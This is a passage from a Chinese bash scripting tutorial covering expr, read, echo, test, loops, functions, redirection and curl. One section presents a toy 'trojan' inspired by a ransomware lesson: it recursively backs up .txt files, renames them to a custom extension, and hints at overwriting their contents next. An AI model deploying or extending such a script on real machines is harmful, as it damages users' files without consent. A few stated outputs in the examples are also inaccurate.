<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> index <span class="token string">"<span class="token variable">${str}</span>"</span> abc<span class="token variable">`</span></span> <span class="token comment"># index 求 abc三个字符中单个字符最早出现的下标，输出7</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> substr <span class="token string">"<span class="token variable">${str}</span>"</span> <span class="token number">1</span> <span class="token number">5</span><span class="token variable">`</span></span> <span class="token comment"># substr切割，类比js的splice，输出Hell</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="运算"><a href="#运算" class="headerlink" title="运算"></a>运算</h4><p>之前就注意到了，变量直接初始化是自动处理为字符串，要进行运算的话就需要像下面这样</p>
<p>注意，shell中的很多符号都已经有了定义，所以需要加上<code>\</code>来定义</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">3</span>
<span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">4</span>
<span class="token builtin class-name">echo</span> a + b <span class="token comment"># 输出字符串 a + b</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> a + b<span class="token variable">`</span></span> <span class="token comment"># 报错，没有数字参数</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> $a + $b<span class="token variable">`</span></span> <span class="token comment"># 输出 7</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> $a * $b<span class="token variable">`</span></span> <span class="token comment"># 报错，语法错误（因为*需要转义）</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token punctuation">\</span><span class="token punctuation">(</span>$a + $b<span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token punctuation">\</span>* <span class="token number">20</span> % <span class="token number">6</span><span class="token variable">`</span></span> <span class="token comment"># 报错，没有数字参数</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token punctuation">\</span><span class="token punctuation">(</span> $a + $b <span class="token punctuation">\</span><span class="token punctuation">)</span> <span class="token punctuation">\</span>* <span class="token number">20</span> % <span class="token number">6</span><span class="token variable">`</span></span> <span class="token comment"># 输出2，运算符两边都</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token number">3</span> <span class="token punctuation">\</span><span class="token operator">&lt;</span> <span class="token number">4</span><span class="token variable">`</span></span> <span class="token comment"># 输出1（竟然不是输出True）</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token number">3</span> <span class="token operator">&gt;=</span> <span class="token number">4</span><span class="token variable">`</span></span> <span class="token comment"># 报错，这里应该写作 \&gt;\= </span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token number">0</span> <span class="token punctuation">\</span><span class="token operator">|</span> <span class="token number">5</span><span class="token variable">`</span></span> <span class="token comment"># 输出5</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token number">2</span> <span class="token punctuation">\</span><span class="token operator">&amp;</span> <span class="token number">3</span><span class="token variable">`</span></span> <span class="token comment"># 输出2， &amp;运算是两个都为非0则输出第一个</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token number">1</span> <span class="token punctuation">\</span><span class="token operator">=</span> True<span class="token variable">`</span></span> <span class="token comment"># 输出0，=和==同义</span>
<span class="token builtin class-name">echo</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> <span class="token number">1</span> <span class="token punctuation">\</span><span class="token operator">=</span><span class="token punctuation">\</span><span class="token operator">=</span> <span class="token number">1</span><span class="token variable">`</span></span> <span class="token comment"># 输出1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="read命令"><a href="#read命令" class="headerlink" title="read命令"></a>read命令</h3><p>就是从stdin读入</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token builtin class-name">read</span> a <span class="token comment"># 等待输入a</span>
<span class="token builtin class-name">echo</span> 这是输入的内容a:<span class="token variable">$a</span>
<span class="token builtin class-name">read</span> -p <span class="token string">"请在5秒内输入b"</span> -t <span class="token number">5</span> b <span class="token comment"># 基于一个提示信息，并且只等待5秒</span>
<span class="token builtin class-name">echo</span> <span class="token variable">$b</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果没有在5s之内进行输入，结束等待，继续往后执行，这样b就会输出空值</p>
<p>还有其他参数:</p>
<blockquote>
<p>-n 5<br>限定只能输入5个字符</p>
<p>-d 字符<br>读取到指定字符时结束输入</p>
</blockquote>
<h3 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h3><h4 id="基本使用-1"><a href="#基本使用-1" class="headerlink" title="基本使用"></a>基本使用</h4><p>除了直接输出内容之外，也可以使用转义字符</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> -e <span class="token string">"I'm Carbon, <span class="token entity" title="\n">\n</span>"</span> <span class="token comment"># -e表示使用转义字符</span>
<span class="token builtin class-name">echo</span> -e <span class="token string">"Hello <span class="token entity" title="\c">\c</span>"</span> <span class="token comment"># \c表示，不换行</span>
<span class="token builtin class-name">echo</span> <span class="token string">"World"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p>输出结果：</p>
<blockquote>
<p>I’m Carbon,</p>
<p>Hello World</p>
</blockquote>
<h4 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h4><p>最简单的使用方式是像下面这样:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">'hello '</span> <span class="token operator">&gt;</span> sayhi.txt
<span class="token builtin class-name">echo</span> <span class="token string">'world'</span> <span class="token operator">&gt;&gt;</span> sayhi.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>其中：</p>
<blockquote>
<p>其中<code>&gt;</code>是覆盖写入，<code>&gt;&gt;</code>是追加写入</p>
</blockquote>
<h3 id="printf命令"><a href="#printf命令" class="headerlink" title="printf命令"></a>printf命令</h3><p>和C/C++的格式化输出是一个意思</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>
<span class="token builtin class-name">printf</span> <span class="token string">"there should be something waiting for %s<span class="token entity" title="\n">\n</span>"</span> <span class="token string">"you"</span>
<span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">2</span>
<span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">3</span>
<span class="token builtin class-name">printf</span> <span class="token string">"everything should have a result like: %d * %d = %d"</span> <span class="token variable">$a</span> <span class="token variable">$b</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> $a <span class="token punctuation">\</span>* $b<span class="token variable">`</span></span> 
<span class="token builtin class-name">printf</span> <span class="token string">"%10.2f."</span> <span class="token variable">$a</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>运行结果:</p>
<blockquote>
<p>there should be something waiting for you<br>everything should have a result like: 2 * 3 = 6<br>      2.00.</p>
</blockquote>
<p>唯一需要注意的是，进行小数点和空格对齐的时候，末尾要加一个点</p>
<h3 id="test命令"><a href="#test命令" class="headerlink" title="test命令"></a>test命令</h3><h4 id="判断逻辑"><a href="#判断逻辑" class="headerlink" title="判断逻辑"></a>判断逻辑</h4><p>这里指的是<code>&amp;&amp;</code>和<code>||</code></p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">0</span>
<span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">1</span>

<span class="token builtin class-name">echo</span> a <span class="token operator">&amp;&amp;</span> b
<span class="token builtin class-name">echo</span> a <span class="token operator">||</span> b<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>二者都具有<strong>短路原则</strong>，<code>&amp;&amp;</code>前一个值为假时，直接忽略</p>
<p>但是有个非常需要重视的点是：</p>
<blockquote>
<p>这里<strong>0代表真，非0代表假</strong></p>
</blockquote>
<h4 id="基本使用-2"><a href="#基本使用-2" class="headerlink" title="基本使用"></a>基本使用</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> <span class="token number">2</span> -lt <span class="token number">6</span> <span class="token comment"># \&lt; 也可以写作 -lt</span>
<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token entity" title="\n">\n</span>The result of the last command:<span class="token variable">$?</span>"</span> <span class="token comment"># $?表示上一个命令的结果或者exit code</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>2小于6为真，所以输出结果是0:</p>
<blockquote>
<p>The result of the last command:0</p>
</blockquote>
<p>除此之外，还可以：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> 变量1 -eq 变量2 <span class="token comment"># 判断是否相等</span>
<span class="token builtin class-name">test</span> 变量1 -ne 变量2 <span class="token comment"># 判断是否不等</span>
<span class="token builtin class-name">test</span> 变量1 -ge 变量2 <span class="token comment"># 判断是否大于等于</span>
<span class="token builtin class-name">test</span> -e 文件名 <span class="token comment"># 判断文件是否存在</span>
<span class="token builtin class-name">test</span> -f 文件名 <span class="token comment"># 判断是否为文件</span>
<span class="token builtin class-name">test</span> -d 文件名 <span class="token comment"># 判断是否为目录</span>
<span class="token builtin class-name">test</span> -r 文件名 <span class="token comment"># 判断文件是否可读</span>
<span class="token builtin class-name">test</span> -w 文件名 <span class="token comment"># 判断文件是否可写</span>
<span class="token builtin class-name">test</span> -s 文件名 <span class="token comment"># 判断文件是否非空</span>
<span class="token builtin class-name">test</span> -x 文件名 <span class="token comment"># 判断文件是否可执行</span>
<span class="token builtin class-name">test</span> -z 字符串 <span class="token comment"># 如果为空则返回真</span>
<span class="token builtin class-name">test</span> -n 字符串 <span class="token comment"># 如果为非空则返回真</span>
<span class="token builtin class-name">test</span> 字符串 <span class="token operator">==</span> 字符串 <span class="token comment"># 判断是否相等</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>如果要判断多个逻辑是否同时成立或者至少成立一个，那么不应该使用<code>&amp;&amp;</code>和<code>||</code>，因为这里的意义并不和我们过去所熟知的那样一致——这里我们应该是使用;</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">test</span> -r test.txt -a -w test.txt <span class="token comment"># -a 就是 and</span>
<span class="token builtin class-name">test</span> -r test.txt -o -w test.txt <span class="token comment"># -o 就是 or</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>



<h4 id="语法糖"><a href="#语法糖" class="headerlink" title="语法糖"></a>语法糖</h4><p><code>test</code>可以简写为<code>[]</code>，注意<code>[]</code>中的每一项都要空格隔开，并且变量和常量都最好用引号包裹</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">name</span><span class="token operator">=</span><span class="token string">"张三"</span>
<span class="token punctuation">[</span> <span class="token string">"张三"</span> <span class="token operator">==</span> <span class="token string">"<span class="token variable">$name</span>"</span> <span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>另外还有<code>[[]]</code>可以支持更多特性</p>
<h3 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h3><h4 id="if式"><a href="#if式" class="headerlink" title="if式"></a>if式</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">66</span>
<span class="token assign-left variable">b</span><span class="token operator">=</span><span class="token number">60</span>

<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$a</span>"</span> -lt <span class="token string">"<span class="token variable">$b</span>"</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$a</span>"</span> -gt <span class="token number">50</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">${a}</span>在范围内

<span class="token keyword">elif</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$a</span>"</span> -lt <span class="token number">66</span> <span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token punctuation">[</span> <span class="token string">"<span class="token variable">$a</span>"</span> -gt <span class="token number">66</span> <span class="token punctuation">]</span>
<span class="token keyword">then</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">${a}</span>不是66
<span class="token keyword">else</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">${a}</span>就是66
<span class="token keyword">fi</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出结果:</p>
<blockquote>
<p>66就是66</p>
</blockquote>
<h4 id="switch式"><a href="#switch式" class="headerlink" title="switch式"></a>switch式</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token assign-left variable">c</span><span class="token operator">=</span><span class="token number">233</span>
<span class="token keyword">case</span> <span class="token variable">$c</span> <span class="token keyword">in</span>
<span class="token number">100</span><span class="token punctuation">)</span>
 	<span class="token builtin class-name">echo</span> <span class="token variable">${c}</span>等于100
	<span class="token punctuation">;</span><span class="token punctuation">;</span>
<span class="token number">233</span><span class="token punctuation">)</span>	
	<span class="token builtin class-name">echo</span> <span class="token variable">${c}</span>等于233
	<span class="token punctuation">;</span><span class="token punctuation">;</span>
*<span class="token punctuation">)</span>
	<span class="token builtin class-name">echo</span> <span class="token variable">${c}</span>是其他值
	<span class="token punctuation">;</span><span class="token punctuation">;</span>
<span class="token keyword">esac</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出结果</p>
<blockquote>
<p>233等于233</p>
</blockquote>
<h3 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h3><h4 id="for式"><a href="#for式" class="headerlink" title="for式"></a>for式</h4><p>基本语法大概是像下面这样的，写法很多，推荐是写法4，能适应大部分情况</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>
<span class="token comment"># for式1</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token number">1</span> <span class="token number">2</span> <span class="token number">3</span> <span class="token number">4</span> <span class="token number">5</span> <span class="token number">6</span>
<span class="token keyword">do</span>
	<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token variable">$i</span>-&gt;<span class="token entity" title="\c">\c</span>"</span>
<span class="token keyword">done</span>

<span class="token builtin class-name">echo</span> 
<span class="token comment"># for式2</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable"><span class="token variable">$(</span><span class="token function">seq</span> <span class="token number">1</span> <span class="token number">15</span><span class="token variable">)</span></span>
<span class="token keyword">do</span>
	<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token variable">$i</span>-&gt;<span class="token entity" title="\c">\c</span>"</span>
<span class="token keyword">done</span>

<span class="token builtin class-name">echo</span>
<span class="token comment"># for式3</span>
<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">..</span><span class="token number">10</span><span class="token punctuation">}</span>
<span class="token keyword">do</span>
	<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token variable">$i</span>-&gt;<span class="token entity" title="\c">\c</span>"</span>
<span class="token keyword">done</span>

<span class="token builtin class-name">echo</span>
<span class="token comment"># for式4</span>
<span class="token keyword">for</span> <span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span><span class="token number">10</span><span class="token punctuation">;</span> i <span class="token operator">++</span><span class="token punctuation">))</span></span>
<span class="token keyword">do</span>
	<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token variable">$i</span>-&gt;<span class="token entity" title="\c">\c</span>"</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>输出结果：</p>
<blockquote>
<p>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;<br>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;8-&gt;9-&gt;10-&gt;11-&gt;12-&gt;13-&gt;14-&gt;15-&gt;<br>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;8-&gt;9-&gt;10-&gt;<br>1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;6-&gt;7-&gt;8-&gt;9-&gt;10-&gt;</p>
</blockquote>
<h4 id="while式"><a href="#while式" class="headerlink" title="while式"></a>while式</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token keyword">while</span> <span class="token builtin class-name">read</span> -p <span class="token string">"输入一个值吧:"</span> someNumber
<span class="token keyword">do</span>
	<span class="token keyword">for</span><span class="token variable"><span class="token punctuation">((</span>i<span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> someNumber<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">))</span></span>
	<span class="token keyword">do</span>
		<span class="token keyword">if</span> <span class="token punctuation">[</span> <span class="token variable"><span class="token variable">`</span><span class="token function">expr</span> $i % <span class="token number">2</span><span class="token variable">`</span></span> -eq <span class="token number">0</span> <span class="token punctuation">]</span>
		<span class="token keyword">then</span>
			<span class="token builtin class-name">echo</span> -e <span class="token string">"<span class="token variable">$i</span> <span class="token entity" title="\c">\c</span>"</span>
		<span class="token keyword">fi</span>
	<span class="token keyword">done</span>
	<span class="token builtin class-name">echo</span>
<span class="token keyword">done</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>当我们输入10和20：</p>
<blockquote>
<p>输入一个值吧:10<br>2 4 6 8 10<br>输入一个值吧:20<br>2 4 6 8 10 12 14 16 18 20</p>
</blockquote>
<h4 id="util式"><a href="#util式" class="headerlink" title="util式"></a>util式</h4><p>下面这样就是直到用户输入OK才会停止</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token keyword">until</span> <span class="token punctuation">[</span> “<span class="token variable">$isOK</span>” <span class="token operator">==</span> <span class="token string">"OK"</span> <span class="token punctuation">]</span>
<span class="token keyword">do</span>
	<span class="token builtin class-name">read</span> -p <span class="token string">"R U OK?"</span> -t <span class="token number">5</span> isOK
	<span class="token builtin class-name">echo</span> -e “status: <span class="token variable">$isOK</span><span class="token punctuation">\</span>n”
<span class="token keyword">done</span>
<span class="token builtin class-name">echo</span> <span class="token string">"U R <span class="token variable">$isOK</span>"</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<blockquote>
<p>当然，个人发现输入总会带上一个换行符….所以这里总是匹配不上，至于到底怎么取消这个换行符，暂时还没去试过</p>
</blockquote>
<h4 id="break和continue"><a href="#break和continue" class="headerlink" title="break和continue"></a>break和continue</h4><p>大体和C/C++相同，略有区别地是<code>break</code>是在<code>switch</code>式中并没有作用</p>
<h4 id="死循环处理"><a href="#死循环处理" class="headerlink" title="死循环处理"></a>死循环处理</h4><p>使用<code>top</code>找到进程PID，然后<code>kill -9 PID</code>结束进程即可</p>
<h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><h4 id="基本使用-3"><a href="#基本使用-3" class="headerlink" title="基本使用"></a>基本使用</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>
<span class="token comment"># 关键字function是可省的</span>
<span class="token keyword">function</span> <span class="token function-name function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token builtin class-name">echo</span> <span class="token string">"Hello World"</span>
<span class="token punctuation">}</span>
fun1 <span class="token comment"># 这是调用函数</span>
<span class="token builtin class-name">echo</span> <span class="token string">"output: <span class="token variable"><span class="token variable">$(</span>fun1<span class="token variable">)</span></span>"</span> <span class="token comment"># 这是拿到函数在stdout的输出</span>
<span class="token builtin class-name">echo</span> <span class="token string">"return: <span class="token variable">$?</span>"</span> <span class="token comment"># 拿到exit code</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>bash的函数返回值很有特点，它的返回值是上文经常提到的<code>exit code</code>，取值范围是[0, 255]，其中0表示正常返回</p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><p>在函数同一行输入其他内容，将作为参数传递，在其内部使用<code>$0</code>,<code>$1</code>,<code>$2</code>等分别访问到</p>
<p>注意，递归不是使用<code>$0</code>——这只是个字符串</p>
<p>直接书写函数名后面跟上参数即可实现递归</p>
<h4 id="局部变量"><a href="#局部变量" class="headerlink" title="局部变量"></a>局部变量</h4><p>使用关键字<code>local</code>声明的变量即为函数局部变量</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function-name function">fun1</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token builtin class-name">local</span> <span class="token assign-left variable">a</span><span class="token operator">=</span><span class="token number">123</span>
	<span class="token builtin class-name">echo</span> a
<span class="token punctuation">}</span>
fun1

<span class="token builtin class-name">echo</span> <span class="token variable">$a</span> <span class="token comment"># 输出空串</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>



<h3 id="exit命令"><a href="#exit命令" class="headerlink" title="exit命令"></a>exit命令</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">exit</span> <span class="token number">0</span>
<span class="token builtin class-name">return</span> <span class="token number">0</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<p>两者都是返回<code>exit code</code>，但是<code>exit</code>是结束整个进程，return仅结束当前函数</p>
<h3 id="文件操作-1"><a href="#文件操作-1" class="headerlink" title="文件操作"></a>文件操作</h3><h4 id="文件重定向"><a href="#文件重定向" class="headerlink" title="文件重定向"></a>文件重定向</h4><p>一个进程默认会打开三个文件描述符: </p>
<blockquote>
<p><strong>stdin</strong><br>标准输入</p>
<p><strong>stdout</strong><br>标准输出</p>
<p><strong>stderr</strong><br>标准错误输出</p>
</blockquote>
<p>可以将这三个重定向到其他文件中，大概长这样:</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token builtin class-name">echo</span> <span class="token string">"hi"</span> <span class="token operator">&gt;</span> text.txt
<span class="token builtin class-name">echo</span> <span class="token string">" world"</span> <span class="token operator">&gt;&gt;</span> text.txt

<span class="token builtin class-name">read</span> text <span class="token operator">&lt;</span> text.txt
<span class="token builtin class-name">echo</span> <span class="token variable">$text</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>还可以组合一下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./test14.sh <span class="token operator">&lt;</span> text.txt <span class="token comment"># test14.sh内部的read语句会接受其中的内容</span>
text.txt <span class="token operator">&gt;</span> res.txt 
<span class="token comment"># 上述两个合起来，简写为:</span>
./test14.sh <span class="token operator">&lt;</span> text.txt <span class="token operator">&gt;</span> res.txt<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>

<h4 id="引入外部脚本"><a href="#引入外部脚本" class="headerlink" title="引入外部脚本"></a>引入外部脚本</h4><p>其实就是类似于import其他代码动态执行，两种写法：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">.</span> 文件名
<span class="token builtin class-name">source</span> 文件名<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="简单木马实战"><a href="#简单木马实战" class="headerlink" title="简单木马实战"></a>简单木马实战</h4><p>正好这两天在上信息安全课，学习了一点勒索病毒的原理后深受启发——让我们实践一下：</p>
<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token shebang important">#! /bin/bash</span>

<span class="token assign-left variable">deadTextDir</span><span class="token operator">=</span><span class="token string">"TextsKilledByCarbonSerio'sBashScript"</span>
<span class="token function-name function">killer</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
	<span class="token function">mkdir</span> <span class="token variable">$deadTextDir</span>
	<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> *.txt
	<span class="token keyword">do</span>
		<span class="token keyword">if</span> <span class="token punctuation">[</span> -e <span class="token variable">$i</span> <span class="token punctuation">]</span>
		<span class="token keyword">then</span>

			<span class="token function">cp</span> <span class="token variable">$i</span> <span class="token string">"<span class="token variable">$deadTextDir</span>/<span class="token variable">$i</span>"</span>
			<span class="token function">mv</span> <span class="token variable">$i</span> <span class="token variable">${i<span class="token operator">%</span>.txt}</span>.CarbonSerio
			<span class="token comment"># rm $i</span>
		<span class="token keyword">fi</span>
	<span class="token keyword">done</span>

	<span class="token keyword">for</span> <span class="token for-or-select variable">i</span> <span class="token keyword">in</span> <span class="token variable">$*</span>
	<span class="token keyword">do</span>
		<span class="token keyword">if</span> <span class="token punctuation">[</span> -d <span class="token variable">$i</span> <span class="token punctuation">]</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">[</span> <span class="token variable">$i</span> <span class="token operator">!=</span> <span class="token variable">$deadTextDir</span> <span class="token punctuation">]</span>  
		<span class="token keyword">then</span>
			<span class="token builtin class-name">cd</span> <span class="token variable">$i</span>
			killer <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span>
		<span class="token keyword">fi</span>
	<span class="token keyword">done</span>
<span class="token punctuation">}</span>

killer <span class="token variable"><span class="token variable">`</span><span class="token function">ls</span><span class="token variable">`</span></span>
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>上面写了很多多余的代码，主要是为了熟悉语法….</p>
<p>当然这个没有什么破坏性，主要是递归改变文件的扩展名会比较烦人——当然，为了便于恢复，这里把每一级目录下修改前的文件都放到了一个文件夹中</p>
<blockquote>
<p>有了这个思路，我们还可以用echo覆盖掉文件原本的内容</p>
<p>甚至还可以更进一步….</p>
</blockquote>
<h3 id="网络请求"><a href="#网络请求" class="headerlink" title="网络请求"></a>网络请求</h3><blockquote>
<p>CommandLine Uniform Resource Locator，其实就是CommandLine URL，用命令行来操作统一资源定位符，<br>通常用于文件的传输，支持FTP(S) HTTP(S)等协议</p>
</blockquote>
<h4 id="发送GET请求"><a href="#发送GET请求" class="headerlink" title="发送GET请求"></a><strong>发送GET请求</strong></h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> http://www.baidu.com/s?wd<span class="token operator">=</span><span class="token number">1024</span>
<span class="token comment"># 不出意外的话,你会收到一堆html</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>

<h4 id="发送POST请求"><a href="#发送POST请求" class="headerlink" title="发送POST请求"></a><strong>发送POST请求</strong></h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span> -X POST -d <span class="token string">'wd=1024'</span> http://www.baidu.com/s
<span class="token comment"># 虽然这个不会得到什么实际的结果，但是至少跑得通</span>
<span class="token comment"># 主要是一时之间我也有什么可以POST</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>

<p><code>-X</code>或者<code>--request</code>代表请求方法（默认是GET，所以GET请求可以省略这个）， <code>-d</code>和<code>--data</code>代表请求体</p>
